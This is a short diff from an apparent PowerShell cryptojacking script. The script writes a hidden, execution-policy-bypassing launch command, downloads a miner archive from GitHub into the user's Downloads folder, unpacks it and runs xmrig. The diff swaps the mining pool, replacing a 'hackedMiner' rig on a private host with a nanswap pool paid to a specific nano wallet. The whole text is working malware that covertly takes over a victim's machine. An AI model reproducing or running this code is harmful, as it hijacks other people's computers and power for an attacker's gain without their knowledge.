@@ -7,4 +7,4 @@ Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPoli
 Invoke-WebRequest "https://raw.githubusercontent.com/zlc1003/miner/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
-./xmrig.exe -o lucasz228.us.to:9200 --rig-id hackedMiner
+./xmrig.exe -o xmrig.nanswap.com:3333 -a rx -k -u nano_3acbzt3t66d51edrp9jrnmg5wpr363g5e6udf5otn8s5ppp7dnubbz5epeci -p x
